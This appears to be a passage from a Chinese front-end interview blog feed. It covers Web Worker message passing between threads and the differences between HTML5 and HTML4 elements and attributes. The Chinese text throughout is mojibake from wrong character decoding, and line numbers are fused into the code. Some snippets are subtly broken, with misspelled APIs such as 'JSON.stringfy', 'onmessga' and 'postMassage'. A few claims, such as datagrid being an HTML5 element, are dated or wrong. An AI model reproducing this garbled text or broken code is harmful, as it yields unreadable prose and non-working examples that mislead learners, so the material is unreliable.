ç¤ºä¾‹ï¼šä¸Žçº¿ç¨‹è¿›è¡Œæ•°æ®çš„äº¤äº’12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;body&gt; &lt;h1&gt;ä»Žéšæœºç”Ÿæˆçš„æ•°å­—ä¸­æŠ½å–3çš„å€æ•°å¹¶æ˜¾ç¤º&lt;/h1&gt; &lt;table id="table"&gt;&lt;/table&gt; &lt;script&gt; // éšæœºæ•°ç»„ let intArray = new Array(100); let intStr = ''; // ç”Ÿæˆ100ä¸ªéšæœºæ•° for (let i = 0; i &lt; 100; i++) &#123; intArray[i] = parseInt(Math.random() * 100); if (i != 0) &#123; intStr += ';'; &#125; intStr += intArray[i] &#125; let worker = new Worker('script.js'); worker.postMessage(intStr); worker.onmessage = function (event) &#123; if (event.data != '') &#123; let j; let k; let tr; let td; let intArray = event.data.split(';'); let table = document.getElementById('table'); for (let i = 0; i &lt; intArray.length; i++) &#123; j = parseInt(i / 10, 0); k = i % 10; // è¯¥è¡Œä¸å­˜åœ¨ if (k == 0) &#123; // æ·»åŠ è¡Œ tr = document.createElement('tr'); tr.id = 'tr' + j; table.appendChild(tr); &#125; else &#123; tr = document.getElementById('tr' + j); &#125; td = document.createElement('td'); tr.appendChild(td); td.innerHTML = intArray[j * 10 + k]; td.style.backgroundColor = 'blue'; td.style.color = 'white'; td.width = 30; &#125; &#125; &#125; &lt;/script&gt;&lt;/body&gt; 123456789101112131415// script.jsonmessage = function (event) &#123; let &#123; data &#125; = event; let returnStr=""; let intArray = data.split(';'); for (let i = 0; i &lt; intArray.length; i++) &#123; if (parseInt(intArray[i]) % 3 == 0) &#123; if (returnStr != '') &#123; returnStr += ';'; &#125; returnStr += intArray[i] &#125; &#125; postMessage(returnStr)&#125; çº¿ç¨‹åµŒå¥—å•å±‚åµŒå¥— 123456789101112131415161718192021222324252627// html scriptlet worket = new Worker('script.js')worket.onmessage = function(event)&#123; console.log(event.data)&#125;// script.jsonmessage = function(event)&#123; let &#123; data &#125; = event; let worker = new Worker('script2.js') // æŠŠæ•°æ®æäº¤ç»™å­çº¿ç¨‹å¤„ç† worker.postMessage(JSON.stringfy(data)) worker.onmessage = function(event)&#123; // æŠŠç»“æžœè¿”å›žä¸»é¡µé¢ postMessage(event.data); &#125;&#125;// script2.jsonmessage = function(event)&#123; let &#123; data &#125; = event; result = someMethod(data); // å°†å¤„ç†å¥½çš„å¤„ç†è¿”å›ž postMessage(result) // å¦‚æžœä¸å†ä½¿ç”¨åˆ™å…³é—­å­çº¿ç¨‹ close();&#125; å¤šä¸ªçº¿ç¨‹ä¸­è¿›è¡Œæ•°æ®çš„äº¤äº’ å®žçŽ°å­çº¿ç¨‹ä¸Žå­çº¿ç¨‹ä¹‹é—´æ•°æ®äº¤äº’çš„ï¼Œå¤§è‡´éœ€è¦ä¸‹é¢æ­¥éª¤ï¼š å…ˆåˆ›å»ºå‘é€æ•°æ®çš„å­çº¿ç¨‹ æ‰§è¡Œå­çº¿ç¨‹ä¸­çš„ä»»åŠ¡ï¼Œç„¶åŽæŠŠè¦ä¼ é€’çš„æ•°æ®å‘é€ç»™ä¸»çº¿ç¨‹ åœ¨ä¸»çº¿ç¨‹æŽ¥å—åˆ°å­çº¿ç¨‹ä¼ å›žæ¥çš„æ¶ˆæ¯æ—¶ï¼Œåˆ›å»ºæŽ¥å—æ•°æ®çš„å­çº¿ç¨‹ï¼Œç„¶åŽæŠŠå‘é€æ•°æ®çš„å­çº¿ç¨‹ä¸­è¿”å›žçš„æ¶ˆæ¯ä¼ é€’ç»™æŽ¥å—æ•°æ®çš„å­çº¿ç¨‹ æ‰§è¡ŒæŽ¥å—æ•°æ®å­çº¿ç¨‹ä¸­çš„ä»£ç  1234567891011121314151617181920212223242526onmessage = function(event)&#123; let worker; worker = new Worker('worker1.js'); worker.onmessage = function(event)&#123; // æŽ¥å—å­çº¿ç¨‹ä¸­çš„æ•°æ® let &#123; data &#125; = event; worker = new Worker('worker2.js'); // æŠŠä»Žå‘é€æ•°æ®çš„å­çº¿ç¨‹ä¸­å‘å›žçš„æ¶ˆæ¯ä¼ é€’ç»™æŽ¥å—æ•°æ®çš„å­çº¿ç¨‹ worker.postMessage(data); worker.onmessage = function(event)&#123; // èŽ·å–æŽ¥å—æ•°æ®çš„å­çº¿ç¨‹ä¸­ä¼ å›žçš„æ•°æ® let &#123;data&#125; = event; // æŠŠç»“æžœå‘é€åˆ°ä¸»é¡µé¢ postMessage(data); &#125; &#125;&#125;// worker1.js å‘é€æ•°æ®çš„å­çº¿ç¨‹onmessga = function(event)&#123; let &#123;someData&#125; = event; result = someMethod(someData); postMassage(result); // å…³é—­å­çº¿ç¨‹ close();&#125; çº¿ç¨‹ä¸­å¯ç”¨çš„å˜é‡ã€å‡½æ•°ä¸Žç±» self è¡¨ç¤ºæœ¬çº¿ç¨‹èŒƒå›´å†…çš„ä½œç”¨åŸŸ postMessage(message) å‘åˆ›å»ºçº¿ç¨‹çš„æºçª—å£å‘é€ä¿¡æ¯ onmessage èŽ·å–æŽ¥å—æ¶ˆæ¯çš„äº‹ä»¶å¥æŸ„ importScripts(urls) å¯¼å…¥å…¶ä»–è„šæœ¬æ–‡ä»¶ï¼Œå‚æ•°ä¸ºæ–‡ä»¶çš„ URLåœ°å€ï¼Œå¯ä»¥å¯¼å…¥å¤šä¸ª navigator ä¸Ž window.navigatorå¯¹è±¡ç±»ä¼¼ï¼Œå…·æœ‰ appNameã€platformã€userAgentã€appVersionè¿™äº›å±žæ€§ sessionStorage/localStorage å¯ä»¥åœ¨çº¿ç¨‹ä¸­ä½¿ç”¨ Web Storage XMLHttpRequest åœ¨çº¿ç¨‹ä¸­å¤„ç† Ajaxè¯·æ±‚ setTimeout/setInterval åœ¨çº¿ç¨‹ä¸­å®žçŽ°å®šæ—¶å¤„ç† close ç»“æŸæœ¬çº¿ç¨‹ eval/isNaN/escape ä½¿ç”¨ javascipt çš„æ ¸å¿ƒå‡½æ•° object å¯ä»¥åˆ›å»ºå¯¹è±¡ WebSockets ä½¿ç”¨ WebSockets API æ¥æƒ³æœåŠ¡å™¨å‘é€å’ŒæŽ¥æ”¶ä¿¡æ¯]]></content>
      <categories>
        <category>å‰ç«¯é¢è¯•</category>
      </categories>
      <tags>
        <tag>HTML5</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[é¢è¯•å®˜é—®æˆ‘HTML5æ˜¯ä»€ä¹ˆï¼ˆä¸Šï¼‰]]></title>
    <url>%2F%E9%9D%A2%E8%AF%95%E5%AE%98%E9%97%AE%E6%88%91HTML5%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%88%E4%B8%8A%EF%BC%89.html</url>
    <content type="text"><![CDATA[å­¦ä¹ é“¾æŽ¥ï¼šHTML 5ä¸ŽCSS 3æƒå¨æŒ‡å— W3cScholl HTML5 ä¸Ž HTML4 çš„åŒºåˆ«å¸¸è§ä»£ç åŒºåˆ«ï¼š æ–°å¢žçš„ä¸€äº›å±žæ€§ï¼š 12345678910111213141516171819&lt;!--html4--&gt;&lt;form&gt; &lt;p&gt; &lt;label&gt; &lt;input name="search" id="search"&gt; &lt;/label&gt; &lt;/p&gt;&lt;/form&gt;&lt;script&gt; document.getElementById('search').focus();&lt;/script&gt;&lt;!--html5--&gt;&lt;form&gt; &lt;p&gt; &lt;label&gt; &lt;input name="search" autofocus&gt; &lt;/label&gt; &lt;/p&gt;&lt;/form&gt; ç»“æž„ä¸Šï¼š 12345678910111213141516&lt;!--html4--&gt; &lt;div id="header"&gt;&lt;/div&gt; &lt;div id="nav"&gt;&lt;/div&gt; &lt;div class="article"&gt; &lt;div class="section"&gt;&lt;/div&gt; &lt;/div&gt; &lt;div id="side-bar"&gt;&lt;/div&gt; &lt;div id="footer"&gt;&lt;/div&gt;&lt;!--html5--&gt;&lt;header&gt;&lt;/header&gt;&lt;nav&gt;&lt;/nav&gt;&lt;article&gt; &lt;section&gt;&lt;/section&gt;&lt;/article&gt;&lt;aside&gt;&lt;/aside&gt;&lt;footer&gt;&lt;/footer&gt; HTML 5 è¦è§£å†³çš„ä¸‰ä¸ªé—®é¢˜ Web æµè§ˆå™¨ä¹‹é—´çš„å…¼å®¹æ€§å¾ˆä½Ž æ–‡æ¡£ç»“æž„ä¸æ˜Žç¡® Webåº”ç”¨ç¨‹åºçš„åŠŸèƒ½å—åˆ°äº†é™åˆ¶ è¯­æ³•çš„æ”¹å˜HTML è¯­æ³•æ˜¯åœ¨ SGML(Standard Generalized Markup Language)è¯­è¨€çš„åŸºç¡€ä¸Šå»ºç«‹èµ·æ¥çš„ã€‚å¯¹äºŽ HTML çš„æ‰§è¡Œåœ¨å„ä¸ªæµè§ˆå™¨ä¹‹é—´æ²¡æœ‰ç»Ÿä¸€çš„ä¸€ä¸ªæ ‡å‡†ã€‚ HTML5 å°±æ˜¯å›´ç»•è¿™ä¸ªWebæ ‡å‡†ï¼Œé‡æ–°å®šä¹‰äº†ä¸€å¥—åœ¨çŽ°æœ‰çš„ HTML çš„åŸºç¡€ä¸Šä¿®æ”¹è€Œæ¥çš„è¯­æ³•ï¼Œä½¿å®ƒè¿è¡Œåœ¨å„æµè§ˆå™¨æ—¶å®ƒä»¬éƒ½èƒ½ç¬¦åˆè¿™ä¸ªé€šç”¨æ ‡å‡†ã€‚ HTML5 çš„æ ‡è®°æ–¹æ³•1.å†…å®¹ç±»åž‹ï¼ˆContentTypeï¼‰ æ‰©å±•ç¬¦ä»ä¸º â€˜.htmlâ€™æˆ–è€… â€˜.htmâ€™ã€‚å†…å®¹ç±»åž‹ä»ç„¶ä¸º â€˜text/htmlâ€™ 2.DOCTYPE å£°æ˜Ž 1234&lt;!--html4--&gt;&lt;!DOCTYPE html PUBLIC "-//W3C/DTD 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/Xhtml1-transitional.dtd"&gt;&lt;!--html5--&gt;&lt;!DOCTYPE html&gt; 3.æŒ‡å®šå­—ç¬¦ç¼–ç  1234&lt;!--html4--&gt;&lt;meta http-equive="Content-Type" content="text/html;charset=UTF-8"&gt;&lt;!--html5--&gt;&lt;meta charset="UTF-8"&gt; ç¡®ä¿ä¸Žä¹‹å‰çš„HTML ç‰ˆæœ¬å…¼å®¹1.å¯ä»¥çœç•¥æ ‡è®°çš„å…ƒç´  12345ä¸å…è®¸å†™ç»“æŸæ ‡è®°çš„å…ƒç´ æœ‰ï¼šarea/base/br/col/command/embed/hr/img/input/keygen/link/meta/param/source/track/wbrå¯ä»¥çœç•¥ç»“æŸæ ‡è®°çš„å…ƒç´ ï¼šli/dt/dd/p/rt/rp/optgroup/option/colgroup/thead/tbody/tfoot/tr/td/thå¯ä»¥çœç•¥å…¨éƒ¨æ ‡è®°çš„å…ƒç´ (éšå¼å­˜åœ¨ï¼Œåœ¨æ–‡æ¡£ç»“æž„ä»ç„¶å­˜åœ¨)ï¼šhtml/head/body/colgroup/tbody 2.å…·æœ‰ boolean å€¼çš„å±žæ€§ ä¾‹å¦‚ disable/readonly/checked ç­‰ï¼Œåªå†™å±žæ€§ä¸å†™å±žæ€§å€¼æˆ–è€…å±žæ€§å€¼ä¸ºç©ºå­—ç¬¦è¡¨ç¤ºå±žæ€§å€¼ä¸º trueã€‚ 3.çœç•¥å¼•å· 123&lt;input type="text"&gt;&lt;input type='text'&gt;&lt;input type=text&gt; æ–°å¢žçš„å…ƒç´ å’ŒåºŸé™¤çš„å…ƒç´ æ–°å¢ž-html5(html4)ç»“æž„å…ƒç´ section(div) è¡¨ç¤ºé¡µé¢ä¸­çš„ä¸€ä¸ªå†…å®¹åŒºå—ï¼Œç”¨äºŽç« èŠ‚ã€é¡µçœ‰ã€é¡µè„šæˆ–è€…é¡µé¢ä¸­çš„å…¶ä»–éƒ¨åˆ†ã€‚ä¸Ž h1-h6å…ƒç´ ç»“åˆä½¿ç”¨ï¼Œè¡¨ç¤ºæ–‡æ¡£ç»“æž„ article(div) è¡¨ç¤ºé¡µé¢ä¸­çš„ä¸€å—ä¸Žä¸Šä¸‹æ–‡ä¸ç›¸å…³çš„ç‹¬ç«‹å†…å®¹ï¼Œä¾‹å¦‚åšå®¢ä¸­çš„ä¸€ç¯‡æ–‡ç« æˆ–è€…æŠ¥çº¸ä¸­çš„ä¸€ç¯‡æ–‡ç«  aside(div) aside å…ƒç´ è¡¨ç¤º article å…ƒç´ çš„å†…å®¹ä¹‹å¤–çš„ï¼Œä¸Ž article å…ƒç´ å†…å®¹ç›¸å…³çš„è¾…åŠ©ä¿¡æ¯ header(div) è¡¨ç¤ºé¡µé¢ä¸€ä¸ªå†…å®¹åŒºå—æˆ–è€…æ•´ä¸ªé¡µé¢çš„æ ‡é¢˜ hgroup(div) ç”¨äºŽæ•´ä¸ªé¡µé¢æˆ–è€…é¡µé¢ä¸­çš„ä¸€ä¸ªå†…å®¹å—çš„æ ‡é¢˜è¿›è¡Œç»„åˆ footer(div) æ•´ä¸ªé¡µé¢æˆ–è€…é¡µé¢ä¸­çš„ä¸€ä¸ªå†…å®¹åŒºå—çš„è„šæ³¨ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œä¼šåŒ…æ‹¬ä½œè€…çš„å§“åã€åˆ›ä½œæ—¥æœŸä»¥åŠä½œè€…çš„è”ç³»ä¿¡æ¯ã€‚ nav(ul) é¡µé¢ä¸­å¯¼èˆªé“¾æŽ¥éƒ¨åˆ† figure(dl) ä¸€æ®µç‹¬ç«‹çš„æµå†…å®¹ï¼Œä¸€èˆ¬è¡¨ç¤ºæ–‡æ¡£ä¸»ä½“æµå†…å®¹ä¸­çš„ä¸€ä¸ªç‹¬ç«‹å•å…ƒï¼Œä½¿ç”¨ figcaption å…ƒç´  ä¸º figure å…ƒç´ ç»„æ·»æ ‡é¢˜ 12345678910&lt;!--html5--&gt;&lt;figure&gt; &lt;figcaption&gt;Title&lt;/figcaption&gt; &lt;p&gt;hahahahaha&lt;/p&gt;&lt;/figure&gt;&lt;!--html4--&gt;&lt;dl&gt; &lt;h1&gt;Title&lt;/h1&gt; &lt;p&gt;hahahahaha&lt;/p&gt;&lt;/dl&gt; å¤šåª’ä½“å…ƒç´ video(object) å®šä¹‰è§†é¢‘ï¼Œæ¯”å¦‚ç”µå½±ç‰‡æ®µæˆ–è€…å…¶ä»–è§†é¢‘æµ 123456&lt;!--html5--&gt;&lt;video src='movie.ogg' controls='controls'&gt;videoå…ƒç´ &lt;/video&gt;&lt;!--html4--&gt;&lt;object type='video/ogg' data='movie.ogv'&gt; &lt;parma name='src' value="movie.ogv"&gt;&lt;/object&gt; audio(object) å®šä¹‰éŸ³é¢‘ï¼Œæ¯”å¦‚éŸ³ä¹æˆ–è€…å…¶ä»–éŸ³é¢‘æµ 123456&lt;!--html5--&gt;&lt;audio src='music.wav'&gt;audioå…ƒç´ &lt;/audio&gt;&lt;!--html4--&gt;&lt;object type='application/ogg' data='someaudio.wav'&gt; &lt;parma name='src' value="someaudio.wav"&gt;&lt;/object&gt; embed(object) ç”¨æ¥æ’å…¥å„ç§å¤šåª’ä½“ï¼Œæ ¼å¼å¯ä»¥æ˜¯ Midi/Wav/AIFF/AU/MP3 1234&lt;!--html5--&gt;&lt;embed src='music.swf'&gt;embedå…ƒç´ &lt;/embed&gt;&lt;!--html4--&gt;&lt;object type='application/x-shockwave-flash' data='music.swf'&gt;&lt;/object&gt; source ä¸ºåª’ä»‹å…ƒç´ å®šä¹‰åª’ä»‹èµ„æº 12345678910&lt;!--html5--&gt;&lt;audio controls&gt; &lt;source src="horse.ogg" type="audio/ogg"&gt; &lt;source src="horse.mp3" type="audio/mpeg"&gt; Your browser does not support the audio element.&lt;/audio&gt;&lt;!--html4--&gt;&lt;object type='application/ogg' data='someaudio.wav'&gt; &lt;parma name='src' value="someaudio.wav"&gt;&lt;/object&gt; è¯­ä¹‰å…ƒç´ mark(span)å…ƒç´  ç”¨æ¥åœ¨è§†è§‰ä¸Šå‘ç”¨æˆ·å‘ˆçŽ°é‚£äº›éœ€è¦çªå‡ºæ˜¾ç¤ºæˆ–è€…é«˜äº®æ˜¾ç¤ºçš„æ–‡å­—ã€‚mark å…ƒç´ çš„ä¸€ä¸ªæ¯”è¾ƒç»å…¸çš„åº”ç”¨å°±æ˜¯åœ¨æœç´¢ç»“æžœä¸­å‘ç”¨æˆ·é«˜äº®æ˜¾ç¤ºæœç´¢å…³é”®è¯ progress(æ— ) è¡¨ç¤ºè¿›ç¨‹è¿è¡Œä¸­çš„è¿›ç¨‹ï¼Œå¯ä»¥ç”¨ progress æ¥æ˜¾ç¤º javascript ä¸­è€—è´¹æ—¶é—´çš„å‡½æ•°çš„è¿›ç¨‹ meter(æ— ) è¡¨ç¤ºåº¦é‡è¡¡ã€‚ä»…ç”¨äºŽå·²çŸ¥æœ€å¤§å€¼å’Œæœ€å°å€¼çš„åº¦é‡ã€‚å¿…é¡»å®šä¹‰åº¦é‡çš„èŒƒå›´ï¼Œæ—¢å¯ä»¥åœ¨å…ƒç´ çš„æ–‡æœ¬ä¸­ï¼Œä¹Ÿå¯ä»¥åœ¨ min/max å±žæ€§ä¸­å®šä¹‰ã€‚ time(span) è¡¨ç¤ºæ—¥æœŸæˆ–è€…æ—¶é—´ï¼Œä¹Ÿå¯ä»¥åŒæ—¶è¡¨ç¤ºä¸¤è€… ruby(æ— ) è¡¨ç¤º ruby æ³¨é‡Šï¼ˆä¸­æ–‡æ³¨éŸ³æˆ–è€…å­—ç¬¦ï¼‰ åœ¨ä¸œäºšä½¿ç”¨ï¼Œæ˜¾ç¤ºçš„æ˜¯ä¸œäºšå­—ç¬¦çš„å‘éŸ³ã€‚ ä¸Ž &lt;ruby&gt; ä»¥åŠ &lt;rt&gt; æ ‡ç­¾ä¸€åŒä½¿ç”¨ï¼š ruby å…ƒç´ ç”±ä¸€ä¸ªæˆ–å¤šä¸ªå­—ç¬¦ï¼ˆéœ€è¦ä¸€ä¸ªè§£é‡Š/å‘éŸ³ï¼‰å’Œä¸€ä¸ªæä¾›è¯¥ä¿¡æ¯çš„ rt å…ƒç´ ç»„æˆï¼Œè¿˜åŒ…æ‹¬å¯é€‰çš„ rp å…ƒç´ ï¼Œå®šä¹‰å½“æµè§ˆå™¨ä¸æ”¯æŒ â€œrubyâ€ å…ƒç´ æ—¶æ˜¾ç¤ºçš„å†…å®¹ã€‚ 123&lt;&lt;ruby&gt; æ¼¢ &lt;rt&gt; ã„ã„¢Ë‹ &lt;/rt&gt;&lt;/ruby&gt; rt(æ— ) è¡¨ç¤ºå…ƒç´ å­—ç¬¦çš„è§£é‡Šæˆ–è€…å‘éŸ³ rpï¼ˆæ— ï¼‰ åœ¨ ruby æ³¨é‡Šä¸­ä½¿ç”¨ï¼Œä»¥å®šä¹‰ä¸æ”¯æŒ ruby å…ƒç´ çš„æµè§ˆå™¨æ‰€æ˜¾ç¤ºçš„å†…å®¹ wbr è¡¨ç¤ºè½¯æ¢è¡Œï¼Œwbr ä¸Ž br åŒºåˆ«åœ¨äºŽåŽè€…è¡¨ç¤ºæ­¤å¤„å¿…é¡»æ¢è¡Œï¼Œå‰è€…æ˜¯æµè§ˆå™¨çª—å£æˆ–è€…çˆ¶çº§å…ƒç´ çš„å®½åº¦è¶³å¤Ÿå®½çš„æ—¶å€™ä¸è¿›è¡Œæ¢è¡Œï¼Œè€Œå½“å®½åº¦ä¸å¤Ÿæ—¶ï¼Œä¸»åŠ¨åœ¨æ­¤å¤„è¿›è¡Œæ¢è¡Œã€‚wbr å…ƒç´ å¥½åƒå¯¹å­—ç¬¦åž‹çš„è¯­è¨€ä½œç”¨æŒºå¤§ï¼Œä½†æ˜¯å¯¹ä¸­æ–‡æ²¡æœ‰å¤šå¤§ç”¨å¤„ã€‚ 1&lt;p&gt;å­¦ä¹  AJAX ,æ‚¨å¿…é¡»ç†Ÿæ‚‰ &lt;wbr&gt;Http&lt;wbr&gt;Request å¯¹è±¡ã€‚&lt;/p&gt; canvas canvas è¡¨ç¤ºå›¾å½¢ï¼Œæ¯”å¦‚å›¾è¡¨å’Œå…¶ä»–å›¾åƒã€‚å…ƒç´ æœ¬èº«æ²¡æœ‰è¡Œä¸ºï¼Œä»…æä¾›ä¸€å—ç”»å¸ƒï¼Œä½†å®ƒæŠŠä¸€ä¸ªç»˜å›¾ API å±•ç¤ºç»™ å®¢æˆ·ç«¯çš„ javascript ä»¥ä½¿å¾—è„šæœ¬èƒ½å¤ŸæŠŠæƒ³ç»˜åˆ¶çš„ä¸œè¥¿ç»˜åˆ¶åˆ°è¿™å—ç”»å¸ƒä¸Šé¢ã€‚ 1234&lt;!--html5--&gt;&lt;canvas id='myCanvas' width='200' height='200'&gt;&lt;/canvas&gt;&lt;!--html4--&gt;&lt;object type='image/svg+xml' data='inc/hdr.svg' width='200' height='200'&gt;&lt;/object&gt; details details å…ƒç´ è¡¨ç¤ºç”¨æˆ·è¦æ±‚å¾—åˆ°å¹¶ä¸”å¯ä»¥å¾—åˆ°çš„ç»†èŠ‚ä¿¡æ¯ï¼Œå¯ä»¥ä¸Ž summaryå…ƒç´ é…åˆä½¿ç”¨ã€‚summaryæä¾›æ ‡é¢˜æˆ–è€…å›¾ä¾‹ã€‚æ ‡é¢˜æ˜¯å¯è§çš„ï¼Œç”¨æˆ·ç‚¹å‡»æ ‡é¢˜æ—¶ï¼Œä¼šæ˜¾ç¤ºå‡ºç»†èŠ‚ä¿¡æ¯ã€‚summaryå…ƒç´ åº”è¯¥æ˜¯ detailså…ƒç´ çš„ç¬¬ä¸€ä¸ªå­å…ƒç´ ã€‚ 1234&lt;details&gt; &lt;summary&gt;H5&lt;/summary&gt; hahahahha&lt;/details&gt; datalist è¡¨ç¤ºå¯é€‰æ•°æ®çš„åˆ—è¡¨ï¼Œä¸Ž input å…ƒç´ é…åˆä½¿ç”¨ï¼Œå¯ä»¥åˆ¶ä½œå‡º è¾“å…¥å€¼çš„ä¸‹æ‹‰åˆ—è¡¨ã€‚ 123456&lt;input list="cars" /&gt;&lt;datalist id="cars"&gt; &lt;option value="BMW"&gt; &lt;option value="Ford"&gt; &lt;option value="Volvo"&gt;&lt;/datalist&gt; datagrid è¡¨ç¤ºå¯é€‰æ•°æ®çš„åˆ—è¡¨ï¼Œä»¥æ ‘å½¢åˆ—è¡¨çš„å½¢å¼æ¥æ˜¾ç¤º 123456789101112&lt;datagrid&gt; &lt;ol&gt; &lt;li&gt; (datagrid row 0) &lt;/li&gt; &lt;li&gt; (datagrid row 1) &lt;ol style="list-style-type:lower-alpha;"&gt; &lt;li&gt; (datagrid row 1,0) &lt;/li&gt; &lt;li&gt; (datagrid row 1,1) &lt;/li&gt; &lt;/ol&gt; &lt;/li&gt; &lt;li&gt; (datagrid row 2) &lt;/li&gt; &lt;/ol&gt; &lt;/datagrid&gt; output(span) è¡¨ç¤ºä¸åŒç±»åž‹çš„è¾“å‡ºï¼Œæ¯”å¦‚è„šæœ¬è¾“å‡º 123456 &lt;form oninput="x.value=parseInt(a.value)+parseInt(b.value)"&gt; 0 &lt;input type="range" id='a' value="50"&gt;100+ &lt;input type="number" id="b" value="50"&gt;= &lt;output name="x" for="a b"&gt;&lt;/output&gt;&lt;/form&gt; menu è¡¨ç¤ºèœå•åˆ—è¡¨ï¼Œå½“å¸Œæœ›åˆ—å‡ºè¡¨å•æŽ§ä»¶çš„æ—¶å€™ä½¿ç”¨è¯¥æ ‡ç­¾ 12345678910111213141516&lt;menu type="toolbar"&gt; &lt;li&gt; &lt;menu label="File"&gt; &lt;button type="button" onclick="file_new()"&gt;æ–°å»º&lt;/button&gt; &lt;button type="button" onclick="file_open()"&gt;æ‰“å¼€&lt;/button&gt; &lt;button type="button" onclick="file_save()"&gt;ä¿å­˜&lt;/button&gt; &lt;/menu&gt; &lt;/li&gt; &lt;li&gt; &lt;menu label="Edit"&gt; &lt;button type="button" onclick="edit_cut()"&gt;å‰ªåˆ‡&lt;/button&gt; &lt;button type="button" onclick="edit_copy()"&gt;å¤åˆ¶&lt;/button&gt; &lt;button type="button" onclick="edit_paste()"&gt;ç²˜è´´&lt;/button&gt; &lt;/menu&gt; &lt;/li&gt;&lt;/menu&gt; ä½†æ˜¯ç›®å‰ä¸»æµæ‰€æœ‰æµè§ˆå™¨éƒ½ä¸æ”¯æŒè¿™ä¸ªæ ‡ç­¾ inputå…ƒç´ ç±»åž‹email è¡¨ç¤ºå¿…é¡»è¾“å…¥ E-mail url è¾“å…¥ URL åœ°å€ number è¾“å…¥æ•°å€¼ range è¾“å…¥ä¸€å®šèŒƒå›´å†…æ•°å­—å€¼ Date Pickers æ‹¥æœ‰å¤šä¸ªé€‰æ‹©æ—¥æœŸå’Œæ—¶é—´çš„æ–°åž‹è¾“å…¥æ–‡æœ¬æ¡† data-æ—¥ã€æœˆã€å¹´ month-æœˆã€å¹´ week-å‘¨ã€å¹´ time-å°æ—¶ã€åˆ†é’Ÿ datetime-æ—¥ã€æœˆã€å¹´ï¼ˆUTCï¼‰ datetime-local-æ—¥ã€æœˆã€å¹´ï¼ˆæœ¬åœ°æ—¶é—´ï¼‰ åºŸé™¤ï¼ˆæ›¿ä»£å…ƒç´ ï¼‰1.èƒ½ç”¨cssæ›¿ä»£çš„å…ƒç´  1basefont/big/center/font/s/strike(del)/tt/u 2.ä¸å†ä½¿ç”¨ frame æ¡†æž¶ 1frameset/frame/noframesï¼ŒçŽ°åªæ”¯æŒ iframeæ¡†æž¶ã€‚ 3.åªæœ‰éƒ¨åˆ†æµè§ˆå™¨æ”¯æŒçš„å…ƒç´  1applet(embed/obejct)/bgsound(audio)/blink/marquee 4.å…¶ä»–è¢«åºŸé™¤çš„å…ƒç´  1rb(ruby)/acronym(abbr)/dir(ul)/isindex(form+input)/listing(pre)/xmp(code)/nextid(GUIDS)/plaintext('text/plain' MIME ç±»åž‹) æ–°å¢žçš„å±žæ€§å’ŒåºŸé™¤çš„å±žæ€§æ–°å¢žè¡¨å•ç›¸å…³çš„å±žæ€§ input[type=text]ã€selectä¸Ž button æŒ‡å®š autofucuså±žæ€§ï¼Œä»¥æŒ‡å®šçš„æ–¹å¼è®©å…ƒç´ åœ¨ç”»é¢æ‰“å¼€çš„æ—¶å€™è‡ªåŠ¨èŽ·å¾—ç„¦ç‚¹ input[type=text]ä¸Ž textareaæŒ‡å®š placeholderå±žæ€§ï¼Œä¼šå¯¹ç”¨æˆ·çš„è¾“å…¥è¿›è¡Œæç¤ºï¼Œæç¤ºç”¨æˆ·è¾“å…¥çš„å†…å®¹ inputã€outputã€selectã€textareaã€buttonä¸Ž fieldsetæŒ‡å®š formå±žæ€§ï¼Œå£°æ˜Žå®ƒä»¬å±žæ€§å“ªä¸ªè¡¨å•ï¼Œç„¶åŽå°†å…¶æ”¾ç½®ä»»ä½•ä½ç½®ï¼Œè€Œä¸æ˜¯åœ¨è¡¨å•ä¹‹å†… input[type=text]ä¸Ž textareaæŒ‡å®š requiredã€‚è¡¨ç¤ºç”¨æˆ·æäº¤çš„æ—¶å€™è¿›è¡Œæ£€æŸ¥ï¼Œæ£€æŸ¥è¯¥å…ƒç´ å†…ä¸€å®šè¦æœ‰è¾“å…¥å†…å®¹ inputå…¶ä»–æ–°å¢žçš„å±žæ€§ï¼šautocompleteã€minã€maxã€multipleã€patternã€stepã€‚åŒæ—¶è¿˜æœ‰ä¸€ä¸ª æ–°çš„ listå…ƒç´ å¯ä»¥ä¸Ž datalisté…åˆä½¿ç”¨ã€‚datalistä¸Ž autocompleteå±žæ€§é…åˆä½¿ç”¨ã€‚multipleå±žæ€§å…è®¸åœ¨ä¸Šä¼ æ–‡ä»¶çš„æ—¶å€™ä¸€æ¬¡ä¸Šä¼ å¤šä¸ªæ–‡ä»¶ã€‚ inputã€buttonå¢žåŠ äº†æ–°çš„å±žæ€§ formactionã€formenctypeã€formmethodã€formnovalidateä¸Ž formtargetï¼Œå®ƒä»¬å¯ä»¥é‡è½½ formå…ƒç´ çš„ actionã€enctypeã€methodã€novalidateä¸Ž targetå±žæ€§ã€‚ä¸º filesetå¢žåŠ äº† disabledï¼Œå¯ä»¥æŠŠå®ƒçš„å­å…ƒç´ è®¾ä¸º disabled(æ— æ•ˆ)çŠ¶æ€ inputã€buttonã€formå¢žåŠ äº† novalidateå±žæ€§ï¼Œè¯¥å±žæ€§å¯ä»¥å–æ¶ˆæäº¤æ—¶è¿›è¡Œçš„æœ‰å…³æ£€æŸ¥ï¼Œè¡¨å•å¯ä»¥è¢«æ— æ¡ä»¶æäº¤ã€‚ é“¾æŽ¥ç›¸å…³å±žæ€§ aä¸Ž areaå¢žåŠ  mediaå±žæ€§ï¼Œè¯¥å±žæ€§è§„å®šç›®æ ‡ URLæ˜¯ä»€ä¹ˆç±»åž‹çš„åª’ä»‹/è®¾å¤‡è¿›è¡Œä¼˜åŒ–ï¼Œåªèƒ½åœ¨ hrefå±žæ€§å­˜åœ¨æ—¶ä½¿ç”¨ ä¸º areaå…ƒç´ å¢žåŠ äº† hreflangå±žæ€§ä¸Ž relå±žæ€§ï¼Œä»¥ä¿æŒä¸Ž aå…ƒç´ ã€linkå…ƒç´ çš„ä¸€è‡´ã€‚ linkå…ƒç´ å¢žåŠ äº†æ–°çš„å±žæ€§ sizesã€‚è¯¥å±žæ€§å¯ä»¥ä¸Ž iconå±žæ€§å…ƒç´ ç»“åˆä½¿ç”¨(é€šè¿‡ relå±žæ€§)ï¼Œè¯¥å±žæ€§æŒ‡å®šå…³è”å›¾æ ‡ï¼ˆiconå…ƒç´ ï¼‰çš„å¤§å°ã€‚ ä¸º baseå…ƒç´ å¢žåŠ äº†targetå±žæ€§ï¼Œä¸»è¦ç›®çš„æ˜¯ä¿æŒä¸Ž aå…ƒç´ çš„ä¸€è‡´æ€§ã€‚ 